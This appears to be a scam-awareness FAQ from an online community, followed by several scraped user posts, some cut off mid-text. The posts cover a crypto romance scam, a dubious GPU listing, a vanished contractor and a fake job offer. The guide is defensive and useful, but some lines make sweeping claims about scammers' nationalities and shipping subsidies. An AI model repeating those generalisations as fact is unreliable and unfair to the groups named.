Fraudsters will offer to pay off your bills, and will do so with fraudulent funds. Sometimes it will be your credit card bill, but it can be any bill that can be paid online. Once they pay it off, they will ask you to send them money or purchase items for them. The fraudulent transaction will be reversed in the future and you will never be able to keep the money. This scam happens on sites like Craigslist, Twitter, Instagram, and also some dating sites, including SeekingArrangement. 

**[The parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam)**  

A scammer will contact you with a job opportunity that involves accepting and reshipping packages. The packages are either stolen or fraudulently obtained items, and you will not be paid by the scammer. [Here](http://abc7chicago.com/mans-identity-stolen-during-work-from-home-job-scam/3337661/) is a news article about a scam victim who fell for this scam and reshipped over 20 packages containing fraudulently acquired goods. 


**[The Skype sex scam](http://www.bbc.com/news/magazine-37735369)**   

You're on Facebook and you get a friend request from a cute girl you've never met. She wants to start sexting and trading nudes. She'll ask you to send pictures or videos or get on webcam where she can see you naked with your face in the picture.  
The scam: There's no girl. You've sent nudes to a guy pretending to be a girl. As soon as he has the pictures he'll demand money and threaten to send the pictures to your friends and family. Sometimes the scammer will upload the video to a porn site or Youtube to show that they are serious. 

What to do if you are a victim of this scam: You cannot buy silence, you can only rent it. Paying the blackmailer will show them that the information they have is valuable and they will come after you for more money. Let your friends and family know that you were scammed and tell them to ignore friend requests or messages from people they don't know. Also, make sure your privacy settings are locked down and consider deactivating your account. 


**[The underage girl scam](https://www.thedailybeast.com/prisoners-catfished-soldiers-from-behind-bars-posing-as-underage-girls-army-says)** 
 
You're on a dating site or app and you get contacted by a cute girl. She wants to start sexting and trading nudes. Eventually she stops communicating and you get a call from a pissed off guy claiming to be the girl's father, or a police officer, or a private investigator, or something else along those lines. Turns out the girl you were sexting is underage, and her parents want some money for various reasons, such as to pay for a new phone, to pay for therapy, etc. There is, of course, no girl. You were communicating with a scammer. 

What to do if you are a victim of this scam: Stop picking up the phone when the scammers call. Do not pay them, or they will be after you for more money.

**[Phishing](https://en.wikipedia.org/wiki/Phishing)**  

Phishing is when a scammer tries to trick you into giving information to them, such as your password or private financial information. Phishing messages will usually look very similar to official messages, and sometimes they are identical. If you are ever required to login to a different account in order to use a service, you should be incredibly cautious.

PSA: you did not win a giftcard: https://old.reddit.com/r/Scams/comments/fffmle/psa_you_did_not_win_a_gift_card/


**[Sugar scams](https://www.fraud.org/sugarbaby_alert)**

Sugar scammers operate all over the internet and usually come in two varieties: advance-fee scams where the scammer will ask for a payment from you before sending you lots of money, and fake check style scams where the scammer will either pull a classic fake check scam, or will do a ""bill pay"" style scam that involves them paying your bills, or them giving you banking information to pay your bills. If you encounter these scammers, report their accounts and move on. 


**[Google Hangouts](https://medium.com/@HonourableHappy/warning-google-hangouts-a-hotbed-for-scams-fraud-54631305e363)** 

Google Hangouts is a messaging platform used extensively by all kinds of scammers. If you are talking with someone online and they want you to switch to Hangouts, they are likely a scammer and you should proceed with caution. 


**[Publishers Clearing House scams](https://www.consumer.ftc.gov/blog/2018/04/publishers-clearing-house-imposters-keep-coming)**

PCH scams are often advance-fee scams, where you will be promised lots of money after you make an initial payment. [You will never need to pay if you win money from the real PCH.](https://info.pch.com/fraud-protection-2/)

**[Pet scams](https://www.bbb.org/article/investigations/14214-puppy-scams-how-fake-online-pet-sellers-steal-from-unsuspecting-pet-buyers-a-bbb-study)**

You are looking for a specific breed of puppy, bird, or other pet. You come across a nice-looking website that claims to be breeding them and has some available right now - they may even be on sale! The breeders are not local to your area (and may not even list a physical location) but they assure you they can safely ship the pet to you after a deposit or full payment. If you go through with the payment, you will likely be contacted by the ""shipper"" who will inform you about an unexpected shipping/customs/processing fee required to deliver your new pet. But there was never any pet, both the ""breeder"" and the ""shipper"" are scammers, typically operating out of Africa. These sites are rampant and account for a large percentage of online pet seller websites - they typically have a similar layout/template (screenshot - example)

If you are considering buying a pet online, some easy things to check are: (1) The registration date of the domain (if it was created recently it is likely a scam website) (2) Reverse image search the pictures of available pets - you will usually find other scam websites using the same photos. (3) Copy a sentence/section of the text from the ""about us"" page and put it into google (in quotes) - these scammers often copy large parts of their website's text from other places. (4) Search for the domain name and look for entries on petscams.com or other scam-tracking sites. (5) Strongly consider buying/adopting your pet from a local shelter or breeder where you can see the animal in person before putting any money down.

Thanks to /u/djscsi for this entry.

**Fake shipping company scams**

These scams usually start when you try to buy something illegal online, though not always. You will be scammed for the initial payment, and then you will receive an email from the fake shipping company telling you that you need to pay them some sort of fee or bribe. If you pay this, they will keep trying to scam you with increasingly absurd stories until you stop paying, at which point they will blackmail you. If you are involved in this scam, all you can do is ignore the scammers and move on, and try to dispute your payments if possible. 

**[Chinese Upwork scam](https://community.upwork.com/t5/New-to-Upwork/People-are-asking-me-to-use-my-account/td-p/502692)**

Someone will ask you to create an Upwork or other freelancer site account for them and will offer money in return. You will not be paid, and they want to use the accounts to scam people. 

**[Quickbooks invoice scam](https://i.imgur.com/QbPwQtq.jpg)** 

This is a fake check style scam that takes advantage of Quickbooks.

**[The blackmail email scam](https://www.reddit.com/r/Scams/comments/9srjen/the_blackmail_email_scam_part_2/)**  
The exact wording of the emails varies, but there are generally four main parts. They claim to have placed software/malware on a porn/adult video site, they claim to have a video of you masturbating or watching porn, they threaten to release the video to your friends/family/loved ones/boss/dog, and they demand that you pay them in order for them to delete the video. Rest assured that this is a very common spam campaign and there is no truth behind the email or the threats. [Here](http://www.smh.com.au/technology/gadgets-on-the-go/latest-online-scam-aims-to-prick-porn-watchers-guilty-conscience-20170815-gxwvxl.html) are [some](https://www.fraudhelpdesk.org/alerts/blackmail-email-watching-porn/) news [articles](https://www.bbb.org/denver/news-events/news-releases/2017/09/alert-pornography-email-phishing-scam/) about [this](http://blog.dynamoo.com/2017/10/bogus-porn-blackmail-attempt-from.html) scam. 

**[The blackmail mail scam](https://krebsonsecurity.com/2018/01/bitcoin-blackmail-by-snail-mail-preys-on-those-with-guilty-conscience/)**    

This is very similar to the blackmail email scam, but you will receive a letter in the mail. 

**[Rental scams](https://www.cambridgema.gov/cpd/communityresources/CrimePrevention/craigslistscams.aspx)**   
Usually on local sites like Craigslist, scammers will steal photos from legitimate real estate listings and will list them for rent at or below market rate. They will generally be hesitant to tell you the address of the property for ""safety reasons"" and you will not be able to see the unit. They will then ask you to pay them a deposit and they claim they will ship you the keys. In reality, your money is gone and you will have no recourse.    

**[Craigslist vehicle scams](https://www.fraudguides.com/internet/craigslist/car-scams/)**
A scammer will list a vehicle on Craigslist and will offer to ship you the car. In many cases they will also falsely claim to sell you the car through eBay or Amazon. If you are looking for a car on Craigslist and the seller says anything about shipping the car, having an agent, gives you a long story about why they are selling the car, or the listing price is far too low, you are talking to a scammer and you should ignore and move on. 
  
  
**[Advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam)**, also known as the 419 scam, or the Nigerian prince scam. You will receive a communication from someone who claims that you are entitled to a large sum of money, or you can help them obtain a large sum of money. However, they will need money from you before you receive the large sum. 

**[Man in the middle scams](https://www.commerce.wa.gov.au/announcements/wa-organisations-lose-500000-man-middle-scams)**     

Man in the middle scams are very common and very hard to detect. The scammer will impersonate a company or person you are legitimately doing business with, and they will ask you to send the money to one of their own bank accounts or one controlled by a money mule. They have gained access to the legitimate persons email address, so there will be nothing suspicious about the email. To prevent this, make contact in a different way that lets you verify that the person you are talking to is the person you think you are talking to. 

[**Digit wallet scam**](https://www.bbb.org/article/news-releases/22128-scam-alert-this-venmo-scam-sends-you-money-by-accident)

A variation of the fake check scam, the scammer sends you money through a digital wallet (i.e. Venmo, Apple Pay, Zelle, Cash App) along with a message claiming they've sent the money to the wrong person and a request to send the money back. Customer service for these digital wallets may even suggest that you send the money back. However, the money sent is from a stolen credit card and will be removed from your account after a few days. Your transfer is not reversed since it came from your own funds.

**[Cam girl voting/viewer scam](https://mashable.com/2013/07/12/tinder-scam/)**

You will encounter a ""cam girl"" on a dating/messaging/social media/whatever site/app, and the scammer will ask you to go to their site and sign up with your credit card. They may offer a free show, or ask you to vote for them, or any number of other fake stories. 

**[Amateur porn recruitment scam](https://www.reddit.com/r/Scams/comments/bjygwg/instagramtinder_scam/)**

You will encounter a ""pornstar"" on a dating/messaging/social media/whatever site/app, and the scammer will ask you to create an adult film with her/him, but first you need to do something. The story here is usually something to do with verifying your age, or you needing to take an STD test that involves sending money to a site operated by the scammer. 

**Hot girl SMS spam**

You receive a text from a random number with a message along the lines of ""Hey babe I'm here in town again if you wanted to meet up this time, are you around?"" accompanied by a NSFW picture of a hot girl. It's spam, and they'll direct you to their scam website that requires a credit card. 

**[Identity verification scam](https://theonlinedatingscams.com/age-or-date-verification-scam/)**  

You will encounter someone on a dating/messaging/social media/whatever site/app, and the scammer will ask that you verify your identity as they are worried about catfishing. The scammer operates the site, and you are not talking to whoever you think you are talking to. 


This type of scam teases you with something, then tries to make you sign up for something else that costs money. The company involved is often innocent, but they turn a blind eye to the practice as it helps their bottom line, even if they have to occasionally issue refunds. A common variation takes place on dating sites/dating apps, where you will match with someone who claims to be a camgirl who wants you to sign up for a site and vote for her. Another variation takes place on local sites like Craigslist, where the scammers setup fake rental scams and demand that you go through a specific service for a credit check. Once you go through with it, the scammer will stop talking to you. Another variation also takes place on local sites like Craigslist, where scammers will contact you while you are selling a car and will ask you to purchase a Carfax-like report from a specific website.


**[Multi Level Marketing or Affiliate Marketing](https://reddit.com/r/antimlm)**

You apply for a vague job listing for 'sales' on craigslist. Or maybe an old friend from high school adds you on Facebook and says they have an amazing business opportunity for you. Or maybe the well dressed guy who's always interviewing people in the Starbucks that you work at asks if you really want to be slinging coffee the rest of your life.  
The scam: MLMs are little more than pyramid schemes. They involve buying some sort of product (usually snake oil health products like body wraps or supplements) and shilling them to your friends and family. They claim that the really money is recruiting people underneath you who give you a slice of whatever they sell. And if those people underneath you recruit more people, you get a piece of their sales. Ideally if you big enough pyramid underneath you the money will roll in without any work on your part. Failure to see any profit will be your fault for not ""wanting it enough."" The companies will claim that you need to buy their extra training modules or webinars to really start selling. But in reality, the vast majority of people who buy into a MLM won't see a cent. At the end of the day all you'll be doing is annoying your friends and family with your constant recruitment efforts.
What to look out for: Recruiters love to be vague. They won't tell you the name of the company or what exactly the job will entail. They'll pump you up with promises of ""self-generating income"", ""being your own boss"", and ""owning your own company."" They might ask you to read books about success and entrepreneurs. They're hoping you buy into the dream first.   
If you get approached via social media, check their timelines. MLMs will often instruct their victims to pretend that they've already made it. They'll constantly post about how they're hustling and making the big bucks and linking to youtube videos about success. Again, all very vague about what their job actually entails.
If you think you're being recruited: Ask them what exactly the job is. If they can't answer its probably a MLM. Just walk away.

##**Phone scams**

You should generally avoid answering or engaging with random phone calls. Picking up and engaging with a scam call tells the scammers that your phone number is active, and will usually lead to more calls. 

**Tax Call** 

You get a call from somebody claiming to be from your countries tax agency. They say you have unpaid taxes that need to be paid immediately, and you may be arrested or have other legal action taken against you if it is not paid. This scam has caused the [American IRS](https://www.irs.gov/uac/newsroom/scam-phone-calls-continue-irs-identifies-five-easy-ways-to-spot-suspicious-calls), [Canadian CRA](http://www.cra-arc.gc.ca/scrty/frdprvntn/menu-eng.html), [British HMRC](https://www.gov.uk/topic/dealing-with-hmrc/phishing-scams), and [Australian Tax Office](https://www.ato.gov.au/general/online-services/identity-security/verify-or-report-a-scam/) to issue warnings. This scam happens in a wide variety of countries all over the world. 

**[Warrant Call](http://wqad.com/2017/02/03/scott-county-sheriff-arrest-warrant-phone-calls-are-scams/)** 

Very similar to the tax call. You'll get a phone call from an ""agent"", ""officer"", ""sheriff"", or other law enforcement officer claiming that there is a warrant out for your arrest and you will be arrested very soon. They will then offer to settle everything for a fee, usually paid in giftcards. 

**[Legal Documents/Process Server Calls]**

Very similar to the warrant call. You'll get a phone call from a scammer claiming that they are going to serve you legal documents, and they will threaten you with legal consequences if you refuse to comply. They may call themselves ""investigators"", and will sometimes give you a fake case number. 

**[Student Loan Forgiveness Scam](https://www.snopes.com/fact-check/student-loan-forgiveness-scam/)**    
 
Scammers will call you and tell you about a student loan forgiveness program, but they are interested in obtaining private information about you or demanding money in order to join the fake program.    

**[Tech Support Call](https://en.wikipedia.org/wiki/Technical_support_scam)** 
 You receive a call from someone with a heavy accent claiming to be a technician Microsoft or your ISP. They inform you that your PC has a virus and your online banking and other accounts may be compromised if the virus is not removed. They'll have you type in commands and view diagnostics on your PC which shows proof of the virus. Then they'll have you install remote support software so the technician can work on your PC, remove the virus, and install security software. The cost of the labor and software can be hundreds of dollars.  
The scam: There's no virus. The technician isn't a technician and does not work for Microsoft or your ISP. Scammers (primarily out of India) use autodialers to cold-call everyone in the US. Any file they point out to you or command they have you run is completely benign. The software they sell you is either freeware or ineffective.  
What to do you if you're involved with this scam: If the scammers are remotely on your computer as you read this, turn off your PC or laptop via the power button immediately, and then if possible unplug your internet connection. Some of the more vindictive tech scammers have been known to create boot passwords on your computer if they think you've become wise to them and aren't going to pay up. Hang up on the scammers, block the number, and ignore any threats about payment. Performing a system restore on your PC is usually all that is required to remove the scammer's common remote access software. Reports of identity theft from fake tech calls are uncommon, but it would still be a good idea to change your passwords for online banking and monitor your accounts for any possible fraud.  
How to avoid: Ignore any calls claiming that your PC has a virus. Microsoft will never contact you. If you're unsure if a call claiming to be from your ISP is legit, hang up, and then dial the customer support number listed on a recent bill. If you have elderly relatives or family that isn't tech savvy, take the time to fill them in on this scam.   

**[Chinese government scam](https://www.consumer.ftc.gov/blog/2018/04/scammers-impersonate-chinese-consulate)**  

This scam is aimed at Chinese people living in Europe and North America, and involves a voicemail from someone claiming to be associated with the Chinese government, usually through the Chinese consulate/embassy, who is threatening legal action or making general threats.

**[Chinese shipping scam](https://www.ic3.gov/media/2019/190328.aspx)**  

This scam is similar to the Chinese government scam, but involves a seized/suspicious package, and the scammers will connect the victim to other scammers posing as Chinese government investigators. 

**[Social security suspension scam](https://www.consumer.ftc.gov/blog/2018/09/your-social-security-number-isnt-suspended-ever)**  

You will receive a call from someone claiming to work for the government regarding suspicious activity, fraud, or serious crimes connected to your social security number. You'll be asked to speak to an operator and the operator will explain the steps you need to follow in order to fix the problems. It's all a scam, and will lead to you losing money and could lead to identity theft if you give them private financial information. 
  

**Utilities cutoff** 

You get a call from someone who claims that they are from your utility company, and they claim that your utilities will be shut off unless you immediately pay. The scammer will usually ask for payment via gift cards, although they may ask for payment in other ways, such as Western Union or bitcoin. 

**[Relative in custody](https://www.consumer.ftc.gov/articles/0204-family-emergency-scams)**  
Scammer claims to be the police, and they have your son/daughter/nephew/estranged twin in custody. You need to post bail (for some reason in iTunes gift cards or MoneyGram) immediately or the *consequences will never be the same*.   

**[Mexican family scam](https://www.consumer.ftc.gov/blog/2018/07/scammers-create-fake-emergencies-get-your-money)** 

This scam comes in many different flavours, but always involves someone in your family and Mexico. Sometimes the scammer will claim that your family member has been detained, sometimes the scammer will claim that your family member has been kidnapped, and sometimes the scammer will claim that your family member is injured and needs help.  

**General family scams** 

Scammers will gather a large amount of information about you and target your family members using different stories with the goal of gettimg them to send money. 


**[One ring scam](https://www.fcc.gov/consumers/guides/one-ring-phone-scam)**  

Scammers will call you from an international number with the goal of getting you to return their call, causing you to incur expensive calling fees. 


##**Online shopping scams**  
**THE GOLDEN RULE OF ONLINE SHOPPING: If it sounds too good to be true, it probably is.**


**Dropshipping**  

An ad on reddit or social media sites like Facebook and Instagram offers items at huge discounts or even free (sometimes requiring you to reblog or like their page). They just ask you to pay shipping.   
The scam: The item will turn out to be very low quality and will take weeks or even months to arrive. Sometimes the item never arrives, and the store disappears or stops responding. The seller drop-ships the item from China. The item may only cost a few dollars, and the Chinese government actually pays for the shipping. You end up paying $10-$15 dollars for a $4 item, with the scammer keeping the profit. If you find one of these scams but really have your heart set on the item, you can find it on AliExpress or another Chinese retailer.  


**[Influencer scams](https://theuncorkedlibrarian.com/instagram-scams/)** 

A user will reach out to you on a social media platform, usually Instagram, and offer you the chance to partner with them and receive a free/discounted product, as long as you pay shipping. This is a different version of the dropshipping scam, and is just a marketing technique to get you to buy their products.


**[Triangulation fraud](https://krebsonsecurity.com/2015/11/how-carders-can-use-ebay-as-a-virtual-atm/)**    

Triangulation fraud occurs when you make a purchase on a site like Amazon or eBay for an item at a lower than market price, and receive an item that was clearly purchased new at full price. The scammer uses a stolen credit card to order your item, while the money from the listing is almost all profit for the scammer. 

**Instagram influencer scams**  

Someone will message you on Instagram asking you to promote their products, and offering you a discount code. The items are Chinese junk, and the offer is made to many people at a time. 

**Cheap Items** 

Many websites pop up and offer expensive products, including electronics, clothes, watches, sunglasses, and shoes at very low prices.  
The scam: Some sites are selling cheap knock-offs. Some will just take your money and run.    
What to do if you think you're involved with this scam: Contact your bank or credit card and dispute the charge.   
How to avoid: The sites often have every brand-name shoe or fashion item (Air Jordan, Yeezy, Gucci, etc) in stock and often at a discounted price. The site will claim to be an outlet for a major brand or even a specific line or item. The site will have images at the bottom claiming to be Secured by Norton or various official payment processors but not actual links. The site will have poor grammar and a mish-mash of categories. Recently, established websites will get hacked or their domain name jacked and turned into scam stores, meaning the domain name of the store will be completely unrelated to the items they're selling. If the deal sounds too good to be true it probably is. Nobody is offering brand new iPhones or Beats or Nintendo Switches for 75% off. 


**[Cheap Amazon 3rd Party Items](https://www.forbes.com/sites/wadeshepard/2017/01/02/amazon-scams-on-the-rise-in-2017-as-fraudulent-sellers-run-amok-and-profit-big/)** 

You're on Amazon or maybe just Googling for an item and you see it for an unbelievable price from a third-party seller. You know Amazon has your back so you order it. 
The scam: One of three things usually happen:  
1) The seller marks the items as shipped and sends a fake tracking number. Amazon releases the funds to the seller, and the seller disappears. Amazon ultimately refunds your money.
2) The seller immediately cancels the order and instructs you to re-order the item directly from their website, usually with the guarantee that the order is still protected by Amazon. The seller takes your money and runs. Amazon informs you that they do not offer protection on items sold outside of Amazon and cannot help you.  
2) The seller immediately cancels the order and instructs you to instead send payment via an unused Amazon gift card by sending the code on the back via email. Once the seller uses the code, the money on the card is gone and cannot be refunded.    
How to avoid: These scammers can be identified by looking at their Amazon storefronts. They'll be brand new sellers offering a wide range of items at unbelievable prices. Usually their Amazon names will be gibberish, or a variation on FIRSTNAME.LASTNAME. Occasionally however, established storefronts will be hacked. If the deal is too good to be true its most likely a scam.     

**Scams on eBay**    

There are scams on eBay targeting both buyers and sellers. As a seller, you should look out for people who privately message you regarding the order, especially if they ask you to ship to a different address or ask to negotiate via text/email/a messaging service. As a buyer you should look out for new accounts selling in-demand items, established accounts selling in-demand items that they have no previous connection to (you can check their feedback history for a general idea of what they bought/sold in the past), and lookout for people who ask you to go off eBay and use another service to complete the transaction. In many cases you will receive a fake tracking number and your money will be help up for up to a month.   

**Scams on Amazon**   

There are scams on Amazon targeting both buyers and sellers. As a seller, you should look out for people who message you about a listing. As a buyer you should look out for listings that have an email address for you to contact the person to complete the transaction, and you should look out for cheap listings of in-demand items.  


**Scams on Reddit** 

Reddit accounts are frequently purchased and sold by fraudsters who wish to use the high karma count + the age of the account to scam people on buy/sell subreddits. You need to take precautions and be safe whenever you are making a transaction online. 

**Computer scams**

**[Virus scam](http://www.kadansky.com/files/newsletters/2015/2015_08_31.html)** 

A popup or other ad will say that you have a virus and you need to follow their advice in order to remove it. They are lying, and either want you to install malware or pay for their software. 

##**Assorted scams**

**[Chinese Brushing / direct shipping](https://www.forbes.com/sites/wadeshepard/2017/11/27/americans-are-receiving-unordered-parcels-from-chinese-e-criminals-and-cant-do-anything-about-it/#16b4a3cf73da)** 

 If you have ever received an unsolicited small package from China, your address was used to [brush](https://www.wsj.com/articles/fake-orders-brush-up-online-sales-in-china-1425386416). Vendors place fake orders for their own products and send out the orders so that they can increase their ratings.      

**[Money flipping](https://www.stopfraudcolorado.gov/fraud-center/digital-fraud/money-flipping-scams.html)** 

Scammer claims to be a banking insider who can double/triple/bazoople any amount of money you send them, with no consequences of any kind. Obviously, the money disappears into their wallet the moment you send it.

1626179227.0,Fell for a crypto scam and lost all my savings ($240k) - what to do?,"I was recently scammed for all my savings (about $240,000) by someone I thought was my best friend.

I first got into contact with this person when she randomly texted my number, asking me if I was a worker from her local animal shelter, since she wanted to adopt a dog. I told her that she must have the wrong number since I live in a different state, but since I also happen to volunteer at a small animal shelter (and so does my mom) I gave her some good advice about what she could do. We kept chatting very happily after that and seemed to hit it off.

We kept talking for many hours every day about many things, and one of the things she was very excited about was some new crypto currency that she thought will be the next bitcoin. I had always been thinking about investing in crypto, but knew very little about it and told her I wasn't interested, but she didn't seem to mind at all and we just kept talking about other things.

As time went on she showed me screenshots of her currency and how much it was rising, so I asked her to help me just learn and start investing in the standard crypto currencies. She helped me with every step for many hours, and eventually I invested ~10k in the standard currencies like ADA, ETH, etc.

Eventually I saw how much money she was making on her currency, and asked her to help me invest in it too. Again she spent many hours teaching me, basically the way it works is you make an account on her currency's website, and send some standard currencies (BTC/ETC/USDT) to your account there, and charge/exchange the standard currency for her currency.

I started with investing just $5k, and over time I trusted her more I invested more, eventually up to about $70k. Everything seemed to go very well and (it seemed like) I made a ton of money. Per her recommendation, we would hold the currency until it was about to go public and then take our profits. We talked about how we would have a lot of money and also be able to help many people and animals with that money.

Then she let me know of another currency she thought would be very successful, but this time she was only able to get one code (needed to unlock an account). She said that since she trusted me so much, I could be the one to open the account and have sole access to it, and she would send me BTC/ETH to my address when she wanted to invest in it.

So that is what we did, and her second currency worked basically like the first one (with how you exchange BTC/ETH on the website for this new currency). I invested about $70k into this currency over several weeks, she sent me probably around $400k in BTC/ETH which I then exchanged for this currency as well. She really gained my trust by trusting me to handle hundreds of thousands of dollars worth of her money, so I thought surely she couldn‚Äôt be scamming me either.

Eventually, the first currency we invested in announced that it would go public soon, so we prepared to cash in our profits. This was around 3 months after initially talking to her, and we had been talking for hours every day like best friends. But there was a problem, it seemed that we needed to ""unlock"" the currency first before cashing it in, by having $100k in USDT/ETH/BTC in our account. 

She unlocked hers first and even sent me a screenshot with her millions of dollars worth of USDT. It took me about a week longer to move my funds from coinbase into the new currency‚Äôs website. When I finally moved my funds into the new currency's account, it wouldn't let me unlock it, and she told me the website had changed the rules and I needed to put in a lot more money now. I did not have more money though, and I told her that, and I tried to withdraw some of my $100,000 USDT out of this website, but it did not let me.

A few days later, both of the websites I used to buy those currencies went offline. My ""best friend"" said she would see what was going on and help me recover my money. I never heard from her again. Today is exactly 1 month from when the websites shut down and from when she was last online.

I am no crypto expert, but today I believe I was finally able to at least track my 100k USDT from that account. I saw it was indeed sent away to some random address shortly after the website went offline, so of course I now know for sure that I have been scammed.


---


TLDR:
I got scammed for basically all my money (70k + 70k + 100k = $240k) and I guess there is nothing I can do about it.

I know reading my story it seems that I was very stupid and guillable, but I am just feeling lost now and I don't know what to do. Does anyone have any advice for me? Anything would help.

I know that there is something about deducting capital losses from my taxes, but I am not sure how that works. Do I need to save some documentation or something to provide evidence to the IRS?

Also more than half of the money I used to finance the total $240k is from selling stocks during this time, so some of that I still need to pay capital gains taxes on. Is there a possibility that I will actually owe more money to the government than I have, and get in trouble?

Is this a scam?","Hey guys, not sure how many people here are big in the PC space but I was looking to upgrade my old 2080TI as it's starting to have some issues periodically and I stumbled upon the best deal I've ever seen for a new videocard by accident.

https://www.amazon.com/dp/B0BR6HZZ6Z?psc=1&smid=A3I6AOI299KDZJ&ref_=chk_typ_imgToDp

I bought this earlier today after seeing the deal and didn't really think much of it, but then I started thinking...... Why is this so cheap?

After doing some digging it seems like most of the 7000 series cards from Sapphire are being sold by a different seller ""congxinadianzishangwuyouxiangongsi""

They are a new seller but they have thousands of items listed, so I am thinking it's legit, but it also feels far far too good to be true. This is literally on Sapphire's own store and the first thing listed, it's not even listed as a secondary seller.. this is the MAIN seller from sapphire.

So this leads me down 2 lines of thought; either this is some really well executed scam, or the factory is just trying to get rid of a gigantic surplus of these 7900xtx's so they're axing them by dropping their price by half. Still feels too good to be true, but I can't help but feel like there would be no way to pull this off under a seller as big as Sapphire.

I still have a few days to cancel my order, but does anyone have any thoughts?

1697149075.0,Construction scam (Canada),"Just looking on advice of what to do in this situation. Please keep the mocking me to a minimum, as I know I'm a dumbass for falling for this shit! I came across a certain contractor for a construction job, let's call him Bob. Bob was referred to me through a woman that I work with, her husband, lets call him John, does concrete, and he referred me to him for my job. Bob was contracted to do a garage building job for me and everything seemed legit, the only thing that I didn't like was that I couldn't find much info online about the business. John and Bob both assured me many times and even sent me some of his previous work with contacts to call for references, which I did. Still I reluctantly agreed to continue with him to draw up quotes and a contract of what was to be completed. The other thing that didn't sit well with me is the 40% down payment for supplies and architectural drawings to be completed, which amounted to about $45,000. But again both Bob and John assured me everything was fine and said all the right things. I proceeded with the bank draft note, and a couple of smaller ($1000-$3000) electronic funds transfers. The relationship seemed okay over the past couple  months. There were delays with different things to do with the city and such, that also seemed reasonable. Bob sent me architectural drawings a little while ago, we revised them, and he has yet to send me the updated ones. For a week or so now all communication with Bob has been nonexistent. I get no answers to my texts, none to my voice messages, etc. I obviously got a really bad feeling about this because when I was calling recently it went straight to voice-mail. I called Bob from a different number, and guess who answers!?!? Fucking BOB!!! As soon as I said who it is, he hung up immediately. I've now called John and spoke to his wife that I work with and of course they claim to know nothing about it and try to place the blame on me. Obviously I have to sue him, but found it insane that the police cant do a damn thing and just say the entire thing is a civil matter, even though he could be scamming others too. How is it different than stealing?!?! In the mean time how can I find out more info on him cause I don't even have a fucking address.

\-Asking me to download Discord instead of a regular phone, Skype, or Zoom call 

\-They were trying to create a sense of urgency in their email ''We would like to invite you to interview with us. Our slots fill up quickly, so we recommend scheduling as soon as possible'' 

\-The interview manager I was ''assigned to'' cannot be found anywhere on Google, or Linkedin and is not linked to the company 

\-It's not disclosed anywhere that this is an agency hiring for another company 

&#x200B;

In my case, this was for UI/UX Designer position at ApolloMed but they seem to have many different listings. The person I was corresponding with sent the wrong listing to me initially which is not even Linkedin to ApolloMed.

1677609488.0,is this job a scam??,"About a month ago someone approached me on WhatsApp after finding me on LinkedIn saying I'd be a good fit for them. So I enquired about the job but it seems too good to be true. Easy money done in cryptocurrency. 

So the job is to generate data and user accounts for apps. There's no data or coding required all you need to do is click a submit button 40 times. Each time is for a different app and you get a small percentage of the profit which increases the longer you do the job. During training I did this on the trainers account and it made them about 250 USDT which they could withdraw into an app for cryptocurrency and then take it out in ¬£ which is paid straight into your bank account. 

To reset your account for the app data you need to deposit about 100 USDT so about ¬£100. Which will allow you to start the process again and upgrade your account. 

If you log in 5 days in a row you get a bonus of 800 USDT, 15 days = 1500 USDT, 30 days = 3800USDT. 

This is a fair amount of money for about 1 to 2 hours work a day.

1697410766.0,Events & Adventures is expensive garbage,"So this post is partially for me to vent, partially for me to ask for advice, and partially for me to publicly document my experience with them as a warning to anyone else considering paying for a membership with Events & Adventures ([https://eventsandadventures.com/](https://eventsandadventures.com/)). Enjoy.   


TLDR: I'm an idiot and fell for E&A's marketing only to find their ""service"" is high-priced garbage. Please don't be like me.   


I signed up with Events & Adventures while living in Seattle, Washington. I had moved there for a new job; I was unfamiliar with the city and knew basically no one there. I also was desperately single. After spending several months trying and failing to meet, frankly *anyone*, I heard about this company and contacted them. They present themselves as professional organizers for local events for singles to meet each other, which seemed like a great idea for someone in my situation. They charge a premium price for this service, but claim that is because roughly half of the monthly events are provided free, and the rest of the events are at discounted prices. By premium price, I mean literally thousands of dollars for a 1-year membership (the minimum time they let you join for). They also claim they do a thorough screening/background check on all applicants for the safety of their members. The interview process they make you go through was a little weird, but I was so lonely and desperate at this point I looked past that. I unfortunately also looked past all the fine details in the membership agreement, which continues to hound me to this day. I stupidly signed up, agreeing to pay an initial $500 initiation fee and then $130/month for the next 18 months.   


First off, while they heavily imply that they perform background checks on applicants, there is no way they could have performed one on me prior to letting me join. I didn't give them enough identifiable info prior to my ""interview"". As soon as my check cleared at the end of the 1 hour interview and I had signed the membership contract I was allowed to start attending events. As far as I could tell, their screening process begins and ends with ""did their check clear?"" 

&#x200B;

Now, on the the actual events they ""organize"". Calling them amateurish would be generous. The new members ""ice breaker"" was advertised as a wine-tasting and boardgames night. I signed up and was told to bring ""Your favorite board game (optional) and a quick snack for yourself or to share !"" and that it was occurring at a member's house. Seriously. I paid a $500 initiation fee and $130 that month so I could go to some random dude's house and *provide my own boardgames and wine*. E&A literally provided nothing for this event, not the venue, not the drinks, not the entertainment; everything was provided by the paying members. This turned out to be a recurring theme, at least with all of the free events. I did not see a single free event where E&A incurred any costs whatsoever. Quite of few of the events they listed on their calendar were either things that are normally free (like hiking) or community events that they had absolutely no involvement in. As an example, they listed an event called the ""Tacoma Brunch Market Event"" on their calendar. I signed up and drove over to it, only to find out this is a monthly event put on by the Tacoma community; E&A had just slapped in on their calendar to make it look more busy. On top of that,  I didn't find the actual E&A group I was trying to meet up with. I tried calling/texting the host after getting there, but got no response. It was only many hours later, after the event was well over, that I received an apology text from the host claiming they had forgotten their phone with a friend. I would have told the host off, except it turned out they weren't actually an employee of E&A, they were a *volunteer member*. In fact, of all the events I attended, only the very first ""ice breaker"" event actually had a single E&A staff at it, all of the other hosts were just paying members. I suppose the paid events might have been better organized, but the prices they were asking seemed pretty outrageous, even before considering the monthly fee I was already paying to the company. I never went to a paid event. 

&#x200B;

As I'm sure many of you have already surmised, it's next to impossible to cancel the membership agreement. The fine print on their membership contract states ""All membership agreements signed outside of an Events and Adventures office can be cancelled within 3 business days with no cancellation penalty, if you have not yet attended an event."" So basically, by the time you understand what the service is actually like, you're trapped in the contract. In my case, I ended up moving back to my old company in San Diego. Even though E&A does not provide their ""service"" in San Diego, they will not let me cancel the agreement. They've explicitly acknowledged to me that they realize I cannot attend any of their events, but they are still charging me anyways (\~$1600 for the rest of my membership). 

&#x200B;

